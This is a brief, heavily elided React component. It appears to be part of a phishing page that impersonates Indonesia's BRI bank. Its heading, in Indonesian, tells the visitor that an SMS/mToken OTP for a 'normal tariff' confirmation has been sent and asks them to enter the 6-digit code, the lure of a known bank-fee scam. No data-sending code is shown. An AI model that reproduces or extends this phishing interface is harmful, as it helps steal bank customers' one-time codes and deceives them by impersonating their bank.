...
const SiteVerifikasi = ({btnClick}) => {
  ...
  return (        
    <div style={{width:'100%', padding:'0 1rem', color:'#000', marginTop:'2em'}}>  
        ...
        <h1 style={{textAlign:'center', fontWeight:'bold', marginTop:'1em'}}>Kode SMS/mToken untuk konfirmasi sms dari OTP BRI tarif normal telah kami kirimkan ke nomor Handphone anda, Silahkan cek sms di Handphone anda. lalu masukkan kode mToken 6 angka</h1>    
